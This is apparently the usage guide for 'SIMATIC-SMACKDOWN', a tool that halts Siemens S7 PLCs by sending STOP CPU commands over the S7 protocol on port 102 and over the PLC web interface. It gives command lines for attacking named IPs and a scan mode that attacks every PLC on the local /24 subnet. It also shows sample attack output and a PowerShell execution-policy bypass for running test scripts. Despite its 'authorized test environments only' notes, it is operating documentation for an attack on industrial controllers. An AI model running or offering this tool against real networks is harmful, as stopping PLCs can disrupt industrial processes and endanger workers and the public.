# SIMATIC-SMACKDOWN Usage Guide

## Command Line Arguments

The tool now supports two modes of operation:

### 1. Targeted Mode (with IP arguments)
Attack specific PLCs by providing their IP addresses as command-line arguments:

```bash
# Single target
./simatic_smackdown 192.168.1.50

# Multiple targets
./simatic_smackdown 192.168.1.50 192.168.1.51 10.0.0.100

# Windows
simatic_smackdown.exe 192.168.1.50 192.168.1.51
```

**Features:**
- Only targets the specified IP addresses
- Validates each IP before attempting connection
- Verifies port 102 is open before attacking
- Skips invalid IP addresses with warnings

### 2. Network Scan Mode (no arguments)
Scans the entire local subnet for PLCs:

```bash
# Linux/Mac
./simatic_smackdown

# Windows
simatic_smackdown.exe
```

**Features:**
- Automatically detects local network interface
- Scans entire /24 subnet (254 addresses)
- Attacks all discovered PLCs

## Output Indicators

- `[+]` Success or positive result
- `[*]` Information or ongoing operation
- `[!]` Attack action or warning
- `[-]` Failure or negative result
- `[ERROR]` Critical error

## Examples

### Example 1: Target specific test PLCs
```
> simatic_smackdown.exe 192.168.1.50 192.168.1.51
=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===
[*] Target mode: Specific IPs provided
[+] Added target: 192.168.1.50
[+] Added target: 192.168.1.51
[*] Verifying target IPs for S7 PLCs on port 102...
[+] Confirmed S7 PLC at: 192.168.1.50
[-] Target 192.168.1.51 is not reachable on port 102

[*] Proceeding with attack on 1 target(s)

[*] Initiating S7 protocol STOP CPU attack...
[!] Sending STOP command to PLC at 192.168.1.50 via S7 protocol
[*] S7 protocol attack phase complete

[*] Initiating HTTP web interface STOP attack...
[!] Sending STOP command to PLC at 192.168.1.50 via HTTP interface
[+] HTTP request sent successfully to 192.168.1.50 (Status: 200 OK)
[*] HTTP attack phase complete

[*] Attack simulation complete.
[*] Targeted 1 PLCs in total
```

### Example 2: Invalid IP handling
```
> simatic_smackdown.exe 192.168.1.50 invalid-ip 256.256.256.256
=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===
[*] Target mode: Specific IPs provided
[+] Added target: 192.168.1.50
[-] Invalid IP address: invalid-ip (skipping)
[-] Invalid IP address: 256.256.256.256 (skipping)
...
```

### Example 3: Network scan mode
```
> simatic_smackdown.exe
=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===
[*] Target mode: Network scan
[*] No specific targets provided - scanning local network...
[+] Found local IP address: 192.168.1.100
[*] Targeting subnet: 192.168.1.100/24
[+] Generated 254 IP addresses in subnet 192.168.1.100/24
[*] Starting scan for S7 PLCs on port 102...
[+] Found S7 PLC at: 192.168.1.50
[+] Found S7 PLC at: 192.168.1.51
[+] Scan complete. Found 2 S7 PLCs
...
```

## Testing Scripts

Two test scripts are provided:

1. **test_usage.bat** - For Windows Command Prompt
2. **test_usage.ps1** - For PowerShell (recommended)

Run the PowerShell script:
```powershell
# You may need to allow script execution first
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# Run the test script
.\test_usage.ps1
```

## Safety Notes

- Always use in authorized test environments only
- The targeted mode helps prevent accidental scanning of production networks
- Verify target IPs before running the tool
- The destructive filesystem functions remain commented out for safety
